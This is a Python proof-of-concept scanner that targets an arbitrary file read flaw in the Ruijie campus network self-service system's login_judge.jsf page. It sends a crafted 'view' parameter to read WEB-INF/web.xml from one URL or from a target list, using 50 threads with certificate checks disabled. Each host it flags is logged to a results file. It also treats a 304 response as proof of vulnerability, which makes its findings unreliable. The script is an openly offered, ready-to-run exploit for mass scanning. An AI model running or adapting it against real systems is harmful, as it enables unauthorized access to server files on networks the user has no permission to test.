import argparse
from multiprocessing.dummy import Pool
import requests
import sys

requests.packages.urllib3.disable_warnings()




def banner():
    banner = """

《《《《《锐捷校园网自助服务系统login_judge任意文件读取》》》》》

"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="锐捷校园网自助服务系统login_judge任意文件读取")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open(args.file, mode='r', encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n', ''))

        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):

    payload = "/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F"
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "If-Modified-Since": "Tue, 25 Dec 2018 05:07:08 GMT",
        "If-None-Match": "W/\"14318-1545714428000\"",
        "Priority": "u=1"
    }

    try:
        re = requests.get(url=url, headers=headers, verify=False, timeout=5)
        if re.status_code == 304:
            print(f'[+] {url} 存在任意文件读取漏洞！')
            with open('result.txt', mode='a', encoding='utf-8') as ft:
                ft.write(target + '\n')
        else:
            print('不存在该漏洞!!')
    except:
        pass


if __name__ == '__main__':
    main()